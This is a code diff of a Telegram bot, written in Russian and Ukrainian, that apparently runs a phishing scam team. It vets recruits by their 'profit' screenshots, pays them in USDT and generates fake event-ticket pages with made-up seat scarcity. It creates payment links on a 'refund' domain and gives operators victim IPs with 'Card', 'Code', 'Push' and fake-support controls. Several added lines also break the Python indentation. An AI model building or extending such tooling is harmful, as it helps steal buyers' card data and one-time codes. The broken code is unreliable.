@@ -4,7 +4,7 @@ import sqlite3
 import json
 from datetime import datetime, timedelta
 from aiogram import Bot, Dispatcher, Router, types
-from aiogram.filters import Command, Filter
+from aiogram.filters import Command
 from aiogram.types import (
     ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardRemove
 )
@@ -26,32 +26,6 @@ from config import API_TOKEN, ADMIN_GROUP_ID, ADMIN_IDS, PAYMENT_GROUP_ID
 import requests
 from aiohttp.web_middlewares import middleware
 import re
-import time
-import threading
-
-from aiogram.filters import Filter
-
-class StepFilter(Filter):
-    def __init__(self, step_name):
-        self.step_name = step_name
-    async def __call__(self, message):
-        uid = message.from_user.id
-        step, _ = get_user_state(uid)
-        return step == self.step_name
-
-class StepStartsWithFilter(Filter):
-    def __init__(self, prefix):
-        self.prefix = prefix
-    async def __call__(self, message):
-        uid = message.from_user.id
-        step, _ = get_user_state(uid)
-        return step and step.startswith(self.prefix)
-
-class StepIsNoneFilter(Filter):
-    async def __call__(self, message):
-        uid = message.from_user.id
-        step, _ = get_user_state(uid)
-        return step is None
 
 # --- Logging setup ---
 logging.basicConfig(
@@ -202,20 +176,20 @@ def create_site_user(dates, currency, street, price):
         if page_code in busy_codes:
             continue
         try:
-            c.execute('''INSERT INTO site_users 
-                         (id, date_1, date_2, date_3, date_4, date_5, date_6, date_7, date_8, currency, street, price, page_code) 
-                         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
-                      (user_id, dates[0], dates[1], dates[2], dates[3], dates[4], dates[5], dates[6], dates[7], currency, street, price, page_code))
-            conn.commit()
-            # --- Додаємо початкову кількість квитків для кожної події ---
-            for event_index in range(8):
-                if event_index == 1:
-                    places = 3
-                else:
-                    places = random.randint(1, 10)
-                c.execute('INSERT OR REPLACE INTO event_places (page_code, event_index, places) VALUES (?, ?, ?)', (page_code, event_index, places))
-            conn.commit()
-            return user_id, page_code
+    c.execute('''INSERT INTO site_users 
+                 (id, date_1, date_2, date_3, date_4, date_5, date_6, date_7, date_8, currency, street, price, page_code) 
+                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
+              (user_id, dates[0], dates[1], dates[2], dates[3], dates[4], dates[5], dates[6], dates[7], currency, street, price, page_code))
+    conn.commit()
+    # --- Додаємо початкову кількість квитків для кожної події ---
+    for event_index in range(8):
+        if event_index == 1:
+            places = 3
+        else:
+            places = random.randint(1, 10)
+        c.execute('INSERT OR REPLACE INTO event_places (page_code, event_index, places) VALUES (?, ?, ?)', (page_code, event_index, places))
+    conn.commit()
+    return user_id, page_code
         except sqlite3.IntegrityError as e:
             if 'UNIQUE constraint failed: site_users.page_code' in str(e):
                 continue  # спробувати ще раз
@@ -350,6 +324,8 @@ def ban_guard(handler):
 @router.message(Command("start"))
 @ban_guard
 async def cmd_start(message: types.Message):
+    print(f"[TEMP DEBUG] Chat ID: {message.chat.id}")  # Добавляем вывод chat_id
+    print(f"[TEMP DEBUG] Chat ID: {message.chat.id}")  # Додаємо вивід chat_id
     uid = message.from_user.id
     db_user = get_user(uid)
     if db_user:
@@ -359,7 +335,7 @@ async def cmd_start(message: types.Message):
         elif db_user['status'] == 'approved':
             kb = admin_menu_kb if is_admin(uid) else main_menu_kb
             if message.chat.type == "private":
-                await message.answer("Ваша заявка одобрена!\nДля продолжения работы используйте меню ниже:", reply_markup=kb)
+            await message.answer("Ваша заявка одобрена!\nДля продолжения работы используйте меню ниже:", reply_markup=kb)
             else:
                 await message.answer("Ваша заявка одобрена!\nДля продолжения работы используйте меню ниже:", reply_markup=ReplyKeyboardRemove())
             return
@@ -370,108 +346,120 @@ async def cmd_start(message: types.Message):
                     next_time = last + timedelta(days=7)
                     await message.answer(f"Ваша заявка была отклонена. Повторно подать заявку можно {next_time.strftime('%d.%m.%Y %H:%M')}")
                     return
-    set_user_state(uid, 'source', {})
+    user_data[uid] = {}
+    user_step[uid] = 'source'
     await message.answer("📢 Откуда о нас узнали?")
     await message.answer(" ", reply_markup=ReplyKeyboardRemove())
 
-@router.message(StepFilter('source'))
+@router.message(lambda m: m.text and (m.text.lower() == 'отмена' or m.text.lower() == '❌ отмена'))
+@ban_guard
+async def cancel_any_action(message: types.Message):
+    uid = message.from_user.id
+    user_step[uid] = None
+    user_data[uid] = {}
+    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+    await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
+
+@router.message(lambda m: user_step.get(m.from_user.id) == 'source')
 @ban_guard
 async def process_source(message: types.Message):
-    uid = message.from_user.id
-    step, data = get_user_state(uid)
     if message.text and (message.text.lower() == 'отмена' or message.text.lower() == '❌ отмена'):
-        clear_user_state(uid)
+        uid = message.from_user.id
+        user_step[uid] = None
+        user_data[uid] = {}
         kb = admin_menu_kb if is_admin(uid) else main_menu_kb
         await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
         return
+    uid = message.from_user.id
     if message.text not in ["Реклама", "От друга"]:
         await message.answer("📢 Откуда о нас узнали?", reply_markup=source_kb)
         return
-    data['source'] = message.text
+    user_data[uid]['source'] = message.text
     if message.text == "От друга":
-        set_user_state(uid, 'invited_by', data)
+        user_step[uid] = 'invited_by'
         await message.answer("👤 Кто пригласил? (tag или username)", reply_markup=ReplyKeyboardRemove())
     else:
-        set_user_state(uid, 'experience', data)
+        user_step[uid] = 'experience'
         await message.answer("💼 Укажите опыт работы\n⏰ Сколько времени готовы уделять?", reply_markup=ReplyKeyboardRemove())
 
-@router.message(StepFilter('invited_by'))
+@router.message(lambda m: user_step.get(m.from_user.id) == 'invited_by')
 @ban_guard
 async def process_invited_by(message: types.Message):
-    uid = message.from_user.id
-    step, data = get_user_state(uid)
     if message.text and (message.text.lower() == 'отмена' or message.text.lower() == '❌ отмена'):
-        clear_user_state(uid)
+        uid = message.from_user.id
+        user_step[uid] = None
+        user_data[uid] = {}
         kb = admin_menu_kb if is_admin(uid) else main_menu_kb
         await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
         return
-    data['invited_by'] = message.text
-    set_user_state(uid, 'experience', data)
+    uid = message.from_user.id
+    user_data[uid]['invited_by'] = message.text
+    user_step[uid] = 'experience'
     await message.answer("💼 Укажите опыт работы\n⏰ Сколько времени готовы уделять?", reply_markup=ReplyKeyboardRemove())
 
-@router.message(StepFilter('experience'))
+@router.message(lambda m: user_step.get(m.from_user.id) == 'experience')
 @ban_guard
 async def process_experience(message: types.Message):
-    uid = message.from_user.id
-    step, data = get_user_state(uid)
     if message.text and (message.text.lower() == 'отмена' or message.text.lower() == '❌ отмена'):
-        clear_user_state(uid)
+        uid = message.from_user.id
+        user_step[uid] = None
+        user_data[uid] = {}
         kb = admin_menu_kb if is_admin(uid) else main_menu_kb
         await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
         return
-    data['experience'] = message.text
-    data['screenshots'] = []
-    set_user_state(uid, 'screenshots', data)
+    uid = message.from_user.id
+    user_data[uid]['experience'] = message.text
+    user_data[uid]['screenshots'] = []
+    user_step[uid] = 'screenshots'
     await message.answer("🖼 Отправьте скриншоты ваших профитов (до 3х)\nМожно пропустить", reply_markup=skip_kb)
 
+@router.message(lambda m: m.text and m.text.strip().lower() == "пропустить")
+@router.message(lambda m: user_step.get(m.from_user.id) == 'screenshots' and m.text and 'пропустить' in m.text.strip().lower())
 @router.message(lambda m: m.text and m.text.strip().lower() == "пропустить")
 @ban_guard
 async def skip_screenshots(message: types.Message):
     uid = message.from_user.id
-    step, data = get_user_state(uid)
-    if step == 'screenshots':
-        if 'screenshots' not in data:
-            data['screenshots'] = []
+    if user_step.get(uid) == 'screenshots':
+        if 'screenshots' not in user_data.get(uid, {}):
+            user_data.setdefault(uid, {})['screenshots'] = []
         try:
             await finish_form(message)
         except Exception as e:
             print(f"[ERROR] finish_form failed: {e}")
-    clear_user_state(uid)
+    user_step[uid] = None
 
 @router.message(lambda m: m.content_type == types.ContentType.PHOTO)
 @ban_guard
 async def process_screenshots(message: types.Message):
     uid = message.from_user.id
-    step, data = get_user_state(uid)
-    if step != 'screenshots':
+    if user_step.get(uid) != 'screenshots':
         return
-    data.setdefault('screenshots', []).append(message.photo[-1].file_id)
-    if len(data['screenshots']) >= 3:
-        set_user_state(uid, 'screenshots', data)
+    user_data[uid]['screenshots'].append(message.photo[-1].file_id)
+    if len(user_data[uid]['screenshots']) >= 3:
         await finish_form(message)
     else:
-        set_user_state(uid, 'screenshots', data)
-        await message.answer(f"Скриншот {len(data['screenshots'])} принят. Можете отправить еще или нажмите 'Пропустить'.", reply_markup=skip_kb)
+        await message.answer(f"Скриншот {len(user_data[uid]['screenshots'])} принят. Можете отправить еще или нажмите 'Пропустить'.", reply_markup=skip_kb)
 
-@router.message(StepFilter('screenshots'))
+@router.message(lambda m: user_step.get(m.from_user.id) == 'screenshots')
 @ban_guard
 async def process_other(message: types.Message):
     print(f"[DEBUG] process_other handler triggered for user {message.from_user.id}, text: {message.text}")
-    uid = message.from_user.id
-    step, data = get_user_state(uid)
     if message.text and (message.text.lower() == 'отмена' or message.text.lower() == '❌ отмена'):
-        clear_user_state(uid)
+        uid = message.from_user.id
+        user_step[uid] = None
+        user_data[uid] = {}
         kb = admin_menu_kb if is_admin(uid) else main_menu_kb
         await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
         return
+    # Якщо користувач натиснув "Пропустить" (будь-який регістр/пробіли), не обробляємо тут
     if message.text and message.text.strip().lower() == "пропустить":
         return
     await message.answer("Пожалуйста, отправьте скриншот(ы) или нажмите 'Пропустить'.", reply_markup=skip_kb)
 
 async def finish_form(message):
     uid = message.from_user.id
-    step, data = get_user_state(uid)
     username = message.from_user.username or "-"
+    data = user_data.get(uid, {})
     print(f"[DEBUG] finish_form called for {uid}, data: {data}")
     source = data.get('source', '')
     invited_by = data.get('invited_by', '')
@@ -504,7 +492,7 @@ async def finish_form(message):
         print(f"[ERROR] Sending to admin or user failed: {e}")
         import traceback
         traceback.print_exc()
-    clear_user_state(uid)
+    user_step[uid] = None
 
 @router.callback_query(lambda c: c.data.startswith('approve_') or c.data.startswith('reject_'))
 async def process_decision(call: types.CallbackQuery):
@@ -533,7 +521,6 @@ async def process_decision(call: types.CallbackQuery):
 @ban_guard
 async def show_profile(message: types.Message):
     uid = message.from_user.id
-    set_user_state(uid, 'menu', {})
     db_user = get_user(uid)
     nickname = db_user['username'] or db_user['form_json'].get('username') or f"{uid}"
     join_date = db_user['last_submit'][:10] if db_user and db_user['last_submit'] else "-"
@@ -560,15 +547,15 @@ async def show_profile(message: types.Message):
     )
     await message.answer(text, reply_markup=profile_inline_kb, parse_mode='HTML')
     await message.answer("Повернутися в головне меню:", reply_markup=back_inline_kb)
-    clear_user_state(uid)
+    user_step[uid] = None
 
 @router.callback_query(lambda c: c.data == "back_to_menu")
 async def back_to_menu_handler(call: types.CallbackQuery):
     uid = call.from_user.id
-    clear_user_state(uid)
+    user_step[uid] = None
     kb = admin_menu_kb if is_admin(uid) else main_menu_kb
     if call.message.chat.type == "private":
-        await call.message.answer("Возврат в главное меню.", reply_markup=kb)
+    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
     else:
         await call.message.answer("Возврат в главное меню.")
     await call.answer()
@@ -576,21 +563,21 @@ async def back_to_menu_handler(call: types.CallbackQuery):
 @router.callback_query(lambda c: c.data == "change_nickname")
 async def change_nickname_start(call: types.CallbackQuery):
     uid = call.from_user.id
-    step, data = get_user_state(uid)
-    set_user_state(uid, 'change_nickname', data)
+    user_step[uid] = 'change_nickname'
     await call.message.answer("Введите новый псевдоним:")
     await call.answer()
 
-@router.message(StepFilter('change_nickname'))
+@router.message(lambda m: user_step.get(m.from_user.id) == 'change_nickname')
 @ban_guard
 async def change_nickname_save(message: types.Message):
-    uid = message.from_user.id
-    step, data = get_user_state(uid)
     if message.text and (message.text.lower() == 'отмена' or message.text.lower() == '❌ отмена'):
-        clear_user_state(uid)
+        uid = message.from_user.id
+        user_step[uid] = None
+        user_data[uid] = {}
         kb = admin_menu_kb if is_admin(uid) else main_menu_kb
         await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
         return
+    uid = message.from_user.id
     new_nick = message.text.strip()
     c = conn.cursor()
     c.execute('SELECT user_id FROM users WHERE username=?', (new_nick,))
@@ -604,27 +591,27 @@ async def change_nickname_save(message: types.Message):
     form_json['username'] = new_nick
     c.execute('UPDATE users SET form_json=? WHERE user_id=?', (json.dumps(form_json), uid))
     conn.commit()
-    clear_user_state(uid)
+    user_step[uid] = None
     await message.answer(f"Псевдоним изменён на: <b>{new_nick}</b>", parse_mode='HTML', reply_markup=main_menu_kb)
 
 @router.callback_query(lambda c: c.data == "change_wallet")
 async def change_wallet_start(call: types.CallbackQuery):
     uid = call.from_user.id
-    step, data = get_user_state(uid)
-    set_user_state(uid, 'change_wallet', data)
+    user_step[uid] = 'change_wallet'
     await call.message.answer("Введите ваш USDT BEP-20 кошелек:")
     await call.answer()
 
-@router.message(StepFilter('change_wallet'))
+@router.message(lambda m: user_step.get(m.from_user.id) == 'change_wallet')
 @ban_guard
 async def change_wallet_save(message: types.Message):
-    uid = message.from_user.id
-    step, data = get_user_state(uid)
     if message.text and (message.text.lower() == 'отмена' or message.text.lower() == '❌ отмена'):
-        clear_user_state(uid)
+        uid = message.from_user.id
+        user_step[uid] = None
+        user_data[uid] = {}
         kb = admin_menu_kb if is_admin(uid) else main_menu_kb
         await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
         return
+    uid = message.from_user.id
     new_wallet = message.text.strip()
     db_user = get_user(uid)
     form_json = db_user['form_json'] if db_user else {}
@@ -632,38 +619,38 @@ async def change_wallet_save(message: types.Message):
     c = conn.cursor()
     c.execute('UPDATE users SET form_json=? WHERE user_id=?', (json.dumps(form_json), uid))
     conn.commit()
-    clear_user_state(uid)
+    user_step[uid] = None
     await message.answer(f"Кошелек сохранён: <code>{new_wallet}</code>", parse_mode='HTML', reply_markup=main_menu_kb)
 
 # --- Админка ---
 @router.message(lambda m: m.text and 'админ панель' in m.text.lower() and is_admin(m.from_user.id))
 @ban_guard
 async def admin_panel(message: types.Message):
-    uid = message.from_user.id
-    set_user_state(uid, 'admin_panel', {})
     await message.answer("Админ-панель. Выберите действие:", reply_markup=admin_panel_kb)
+    user_step[message.from_user.id] = 'admin_panel'
 
-@router.message(StepFilter('admin_panel'))
+@router.message(lambda m: user_step.get(m.from_user.id) == 'admin_panel')
 @ban_guard
 @log_function
 async def admin_panel_action(message: types.Message):
-    uid = message.from_user.id
-    step, data = get_user_state(uid)
     if message.text and (message.text.lower() == 'отмена' or message.text.lower() == '❌ отмена'):
-        clear_user_state(uid)
+        uid = message.from_user.id
+        user_step[uid] = None
+        user_data[uid] = {}
         kb = admin_menu_kb if is_admin(uid) else main_menu_kb
         await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
         return
+    uid = message.from_user.id
     if message.text == "⬅️ Назад":
         kb = admin_menu_kb
         await message.answer("Возврат в главное меню.", reply_markup=kb)
-        clear_user_state(uid)
+        user_step[uid] = None
         return
     elif message.text == "🚫 Заблокировать / разблокировать":
-        set_user_state(uid, 'ban_unban_user', data)
+        user_step[uid] = 'ban_unban_user'
         await message.answer("Введите username пользователя для блокировки/разблокировки (без @):", reply_markup=ReplyKeyboardRemove())
     elif message.text == "💸 Начислить выплату":
-        set_user_state(uid, 'pay_user', data)
+        user_step[uid] = 'pay_user'
         kb = InlineKeyboardMarkup(
             inline_keyboard=[
                 [InlineKeyboardButton(text="⬅️ Назад", callback_data="payuser_back")]
@@ -714,13 +701,14 @@ async def payuser_back_handler(call: types.CallbackQuery):
 @router.message(lambda m: user_step.get(m.from_user.id) == 'pay_user')
 @ban_guard
 async def admin_pay_user_profile(message: types.Message):
-    uid = message.from_user.id
-    step, data = get_user_state(uid)
     if message.text and (message.text.lower() == 'отмена' or message.text.lower() == '❌ отмена'):
-        clear_user_state(uid)
+        uid = message.from_user.id
+        user_step[uid] = None
+        user_data[uid] = {}
         kb = admin_menu_kb if is_admin(uid) else main_menu_kb
         await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
         return
+    uid = message.from_user.id
     nickname = message.text.strip().lstrip('@')
     c = conn.cursor()
     c.execute('SELECT user_id FROM users WHERE LOWER(username)=?', (nickname.lower(),))
@@ -753,10 +741,9 @@ async def admin_pay_user_profile(message: types.Message):
         f'└ <b>За июнь:</b> <code>{earned_june}$</code>\n'
         '💳 <b>USDT BEP-20 кошелек:</b>\n└ {wallet_str}'
     )
-    data['pay_target'] = target_id
-    data['pay_username'] = nick
-    set_user_state(uid, 'pay_user_profile', data)
+    user_data[uid] = {'pay_target': target_id, 'pay_username': nick}
     await message.answer(text, parse_mode='HTML', reply_markup=admin_pay_kb(nick))
+    user_step[uid] = 'pay_user_profile'
 
 @router.callback_query(lambda c: c.data.startswith('pay_add:') or c.data.startswith('pay_sub:'))
 async def admin_pay_action(call: types.CallbackQuery):
@@ -905,7 +892,7 @@ async def unban_user(call: types.CallbackQuery):
 @ban_guard
 async def tickets_message(message: types.Message):
     uid = message.from_user.id
-    set_user_state(uid, 'ticket_input', {})
+    # Спочатку видаляємо клавіатуру через не-порожнє повідомлення
     await message.answer("Введите данные для билета:", reply_markup=ReplyKeyboardRemove())
     text = (
         "Введите данные по следующему образцу:\n"
@@ -923,11 +910,14 @@ async def tickets_message(message: types.Message):
         ]
     )
     await message.answer(text, reply_markup=kb)
+    user_step[uid] = 'ticket_input'
 
-@router.message(StepFilter('ticket_input'))
+TICKETS_DIR = 'tickets'
+os.makedirs(TICKETS_DIR, exist_ok=True)
+
+@router.message(lambda m: user_step.get(m.from_user.id) == 'ticket_input')
 async def ticket_input_handler(message: types.Message):
     uid = message.from_user.id
-    step, data = get_user_state(uid)
     ticket_text = message.text.strip()
     lines = [l for l in ticket_text.split('\n') if l.strip()]
     if len(lines) < 5:
@@ -989,28 +979,16 @@ async def ticket_input_handler(message: types.Message):
         await message.answer_document(pdf_file, caption=f"{pdf_filename}")
     # Отдельно отправляем ссылку
     await message.answer(ticket_url)
-    clear_user_state(uid)
+    user_step[uid] = None
 
 @router.callback_query(lambda c: c.data == "tickets_cancel")
 async def tickets_cancel_handler(call: types.CallbackQuery):
     uid = call.from_user.id
-    clear_user_state(uid)
+    user_step[uid] = None
+    manual_payment_attempts.pop(uid, None)
     kb = admin_menu_kb if is_admin(uid) else main_menu_kb
     await call.message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
     await call.answer()
-
-# --- Універсальний back-хендлер ---
-@router.message(lambda m: m.text and (m.text.strip().lower() == '⬅️ назад' or m.text.strip().lower() == 'назад'))
-@ban_guard
-async def force_back_to_main(message: types.Message):
-    uid = message.from_user.id
-    step, _ = get_user_state(uid)
-    if step == 'payment_type_selection':
-        print(f"[DEBUG] Skipping force_back_to_main for payment_type_selection")
-        return
-    clear_user_state(uid)
-    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-    await message.answer("Повернення в головне меню.", reply_markup=kb)
 
 # --- Хендлер для кнопки "Ссылки" ---
 links_template_kb = ReplyKeyboardMarkup(
@@ -1024,8 +1002,7 @@ links_template_kb = ReplyKeyboardMarkup(
 @router.message(lambda m: m.text and 'ссылки' in m.text.lower() and (user_step.get(m.from_user.id) is None))
 @ban_guard
 async def handle_links_button(message: types.Message):
-    uid = message.from_user.id
-    set_user_state(uid, 'links_menu', {})  # <-- Спочатку!
+    print("handle_links_button called")
     kb = ReplyKeyboardMarkup(
         keyboard=[
             [KeyboardButton(text="Создать ссылку")],
@@ -1037,7 +1014,7 @@ async def handle_links_button(message: types.Message):
     await message.answer("Выберите действие:", reply_markup=kb)
     user_step[message.chat.id] = 'links_menu'
 
-@router.message(StepFilter('links_menu'))
+@router.message(lambda m: user_step.get(m.from_user.id) == 'links_menu')
 @ban_guard
 async def handle_links_menu(message: types.Message):
     text = message.text.strip().lower()
@@ -1077,7 +1054,7 @@ async def handle_links_menu(message: types.Message):
             resize_keyboard=True
         )
         await message.answer("Последние 50 ссылок. Выберите ссылку:", reply_markup=kb)
-        set_user_state(message.chat.id, 'choose_link_to_edit')
+        user_step[message.chat.id] = 'choose_link_to_edit'
     elif text == "⬅️ назад":
         kb = admin_menu_kb if is_admin(message.from_user.id) else main_menu_kb
         await message.answer("Главное меню:", reply_markup=kb)
@@ -1086,7 +1063,7 @@ async def handle_links_menu(message: types.Message):
     else:
         await message.answer("Пожалуйста, выберите действие из меню.")
 
-@router.message(StepFilter('choose_link_to_edit'))
+@router.message(lambda m: user_step.get(m.from_user.id) == 'choose_link_to_edit')
 @ban_guard
 async def handle_choose_link_to_edit(message: types.Message):
     text = message.text.strip()
@@ -1121,11 +1098,11 @@ async def handle_choose_link_to_edit(message: types.Message):
     await message.answer(f"Настройки для ссылки ?page={page_code}", reply_markup=kb)
     user_step[message.chat.id] = f'edit_link_menu_{page_code}'
 
-@router.message(StepStartsWithFilter('edit_link_menu_'))
+@router.message(lambda m: user_step.get(m.from_user.id, '').startswith('edit_link_menu_'))
 @ban_guard
 async def handle_edit_link_menu(message: types.Message):
     print(f"[DEBUG] handle_edit_link_menu: start, text={message.text!r}, user_step={user_step.get(message.from_user.id)}")
-    state, _ = get_user_state(message.from_user.id)
+    state = user_step.get(message.from_user.id, '')
     page_code = state.replace('edit_link_menu_', '')
     text = message.text.strip().lower()
     print(f"[DEBUG] handle_edit_link_menu: after state, text={text!r}, page_code={page_code}")
@@ -1164,7 +1141,7 @@ async def handle_edit_link_menu(message: types.Message):
     else:
         await message.answer("Пожалуйста, выберите действие из меню.")
 
-@router.message(StepFilter('edit_places_choose_'))
+@router.message(lambda m: user_step.get(m.from_user.id, '').startswith('edit_places_choose_'))
 @ban_guard
 async def handle_edit_places_choose(message: types.Message):
     state = user_step.get(message.from_user.id, '')
@@ -1188,7 +1165,7 @@ async def handle_edit_places_choose(message: types.Message):
     await message.answer(f"Текущее количество мест для {EVENT_FIXED_EVENTS[event_index]}: {places}\n\nВведите новое количество мест:", reply_markup=ReplyKeyboardRemove())
     user_step[message.from_user.id] = f'edit_places_{page_code}_{event_index}'
 
-@router.message(StepFilter('edit_places_'))
+@router.message(lambda m: user_step.get(m.from_user.id, '').startswith('edit_places_'))
 @ban_guard
 async def handle_edit_places(message: types.Message):
     state = user_step.get(message.from_user.id, '')
@@ -1222,12 +1199,7 @@ async def handle_edit_places(message: types.Message):
     await message.answer(f"Настройки для ссылки {page_code}", reply_markup=kb)
     user_step[message.chat.id] = f'edit_link_menu_{page_code}'
 
-def event_all_fields_and_template(m):
-    uid = m.from_user.id
-    step, _ = get_user_state(uid)
-    return step == 'event_all_fields' and m.text and 'шаблон' in m.text.lower()
-
-@router.message(event_all_fields_and_template)
+@router.message(lambda m: user_step.get(m.from_user.id) == 'event_all_fields' and m.text and 'шаблон' in m.text.lower())
 @ban_guard
 async def send_fill_template(message: types.Message):
     template = (
@@ -1246,7 +1218,7 @@ async def send_fill_template(message: types.Message):
     await message.answer(template, reply_markup=ReplyKeyboardRemove())
     user_step[message.chat.id] = 'event_all_fields'
 
-@router.message(StepFilter('event_all_fields'))
+@router.message(lambda m: user_step.get(m.from_user.id) == 'event_all_fields')
 @ban_guard
 async def event_all_fields_handler(message: types.Message):
     if message.text and (message.text.lower() == 'отмена' or message.text.lower() == '❌ отмена'):
@@ -1286,17 +1258,12 @@ async def event_all_fields_handler(message: types.Message):
     await events_save_all(message)
     user_step[message.chat.id] = None
 
-def links_template_wait_and_cancel(m):
-    uid = m.from_user.id
-    step, _ = get_user_state(uid)
-    return step == 'links_template_wait' and m.text and 'отмена' in m.text.lower()
-
-@router.message(links_template_wait_and_cancel)
+@router.message(lambda m: user_step.get(m.from_user.id) == 'links_template_wait' and m.text and 'отмена' in m.text.lower())
 async def cancel_links_template(message: types.Message):
     await message.answer("Действие отменено.", reply_markup=ReplyKeyboardRemove())
     user_step[message.chat.id] = None
 
-@router.message(StepStartsWithFilter('text_for_'))
+@router.message(lambda m: user_step.get(m.from_user.id, '').startswith('text_for_'))
 @log_function
 async def admin_enter_text(message: types.Message):
     print(f"admin_enter_text called by {message.from_user.id} with text: {message.text}")
@@ -1315,7 +1282,7 @@ async def admin_enter_text(message: types.Message):
     user_step[message.from_user.id] = None
 
 # --- Обробник для вибору типу оплати (має бути ПЕРЕД block_others) ---
-@router.message(StepFilter('payment_type_selection'))
+@router.message(lambda m: user_step.get(m.from_user.id) == 'payment_type_selection')
 @ban_guard
 async def payment_type_selection(message: types.Message):
     uid = message.from_user.id
@@ -1340,7 +1307,7 @@ async def payment_type_selection(message: types.Message):
         print(f"[DEBUG] Unknown text in payment_type_selection: {message.text!r}")
         await message.answer("Пожалуйста, выберите тип оплаты из меню.")
 
-@router.message(StepFilter('manual_payment_amount'))
+@router.message(lambda m: user_step.get(m.from_user.id) == 'manual_payment_amount')
 @ban_guard
 async def manual_payment_amount_handler(message: types.Message):
     try:
@@ -1415,19 +1382,18 @@ async def manual_payment_amount_handler(message: types.Message):
 
 @router.message()
 async def block_others(message: types.Message):
-    uid = message.from_user.id
-    step, data = get_user_state(uid)
-    # Throttle: не відповідати частіше, ніж раз на 5 секунд
-    if not can_reply(uid):
-        return
-    print(f"[DEBUG] block_others: text={getattr(message, 'text', None)!r}, type={getattr(message, 'content_type', None)}, user_step={step}")
+    print(f"[DEBUG] block_others: text={getattr(message, 'text', None)!r}, type={getattr(message, 'content_type', None)}, user_step={user_step.get(message.from_user.id)}")
+    # Дати універсальному хендлеру для 'Назад' спрацювати!
     text = getattr(message, 'text', None) or getattr(message, 'caption', None)
     if text and (text.strip().lower() == 'назад' or text.strip().lower() == '⬅️ назад'):
         return
+    uid = message.from_user.id
+    print(f"[block_others] uid={uid}, user_step={user_step.get(uid)}, text={message.text!r}")
     # НЕ обробляємо повідомлення, якщо користувач знаходиться в payment_type_selection або manual_payment_amount
-    if step in ['payment_type_selection', 'manual_payment_amount']:
+    if user_step.get(uid) in ['payment_type_selection', 'manual_payment_amount']:
         print(f"[DEBUG] Skipping block_others for payment_type_selection/manual_payment_amount")
         return
+    # Якщо повідомлення схоже на оплату (число + валюта) і це адмін — надсилаємо посилання
     if is_admin(uid):
         m = re.match(r"^(\d+(?:[.,]\d+)?)\s*([A-Za-z]{3,5})$", message.text.strip())
         if m:
@@ -1436,10 +1402,11 @@ async def block_others(message: types.Message):
             link = f"https://artpullse.com/refund/?total={amount}&currency={currency}"
             await message.answer(f"Ссылка для оплаты для пользователя:\n{link}")
             return
-    print(f"[DEBUG] block_others handler triggered for user {message.from_user.id}, text: {message.text}, user_step: {step}")
+    print(f"[DEBUG] block_others handler triggered for user {message.from_user.id}, text: {message.text}, user_step: {user_step.get(message.from_user.id)}")
+    # Ігноруємо всі кроки сценарію івентів та всі варіанти кнопки 'Ссылки'
     if message.text and 'ссылки' in message.text.lower():
         return
-    if step in ['event_title', 'event_dates', 'event_times', 'event_all_fields']:
+    if user_step.get(message.from_user.id) in ['event_title', 'event_dates', 'event_times', 'event_all_fields']:
         return
     db_user = get_user(uid)
     if db_user and db_user['form_json'].get('banned', False):
@@ -1454,7 +1421,7 @@ async def block_others(message: types.Message):
     if is_admin(uid):
         if message.text in ["🛠️ Админ панель", "🚫 Заблокировать / разблокировать", "💸 Начислить выплату", "⬅️ Назад"]:
             return
-        if step in ['admin_panel', 'ban_unban_user', 'pay_user', 'pay_user_profile', 'pay_amount', 'manual_payment_amount', 'manual_payment_defolt']:
+        if user_step.get(uid) in ['admin_panel', 'ban_unban_user', 'pay_user', 'pay_user_profile', 'pay_amount', 'manual_payment_amount', 'manual_payment_defolt']:
             return
     if db_user and db_user['status'] != 'approved':
         if db_user['status'] == 'pending':
@@ -1664,13 +1631,13 @@ async def payment_notify(request):
         ]
     )
     try:
-        await bot.send_message(PAYMENT_GROUP_ID, msg1, parse_mode='HTML', reply_markup=kb1)
+    await bot.send_message(PAYMENT_GROUP_ID, msg1, parse_mode='HTML', reply_markup=kb1)
     except Exception as e:
         print(f"[ERROR] Не вдалося надіслати msg1 у PAYMENT_GROUP_ID: {e}")
         import traceback
         traceback.print_exc()
     try:
-        await bot.send_message(ADMIN_GROUP_ID, msg1, parse_mode='HTML')  # Без кнопок
+    await bot.send_message(ADMIN_GROUP_ID, msg1, parse_mode='HTML')  # Без кнопок
     except Exception as e:
         print(f"[ERROR] Не вдалося надіслати msg1 у ADMIN_GROUP_ID: {e}")
         import traceback
@@ -1685,24 +1652,24 @@ async def payment_notify(request):
         f"I: {ip}" + sum_str
     )
     kb2_buttons = [
-        InlineKeyboardButton(text="Card", callback_data=f"card:{ip}"),
-        InlineKeyboardButton(text="Block", callback_data=f"block:{ip}"),
-        InlineKeyboardButton(text="Unblock", callback_data=f"unblock:{ip}"),
-        InlineKeyboardButton(text="Code", callback_data=f"code:{ip}")
+            InlineKeyboardButton(text="Card", callback_data=f"card:{ip}"),
+            InlineKeyboardButton(text="Block", callback_data=f"block:{ip}"),
+            InlineKeyboardButton(text="Unblock", callback_data=f"unblock:{ip}"),
+            InlineKeyboardButton(text="Code", callback_data=f"code:{ip}")
     ]
     if page_code:
         kb2_buttons.append(InlineKeyboardButton(text="Push", callback_data=f"push:{ip}:{page_code}"))
     kb2 = InlineKeyboardMarkup(
         inline_keyboard=[
             kb2_buttons,
-            [
+        [
                 InlineKeyboardButton(text="Тех поддержка", callback_data=f"support:{ip}"),
-                InlineKeyboardButton(text="Text", callback_data=f"text:{ip}")
-            ]
+            InlineKeyboardButton(text="Text", callback_data=f"text:{ip}")
         ]
+    ]
     )
     try:
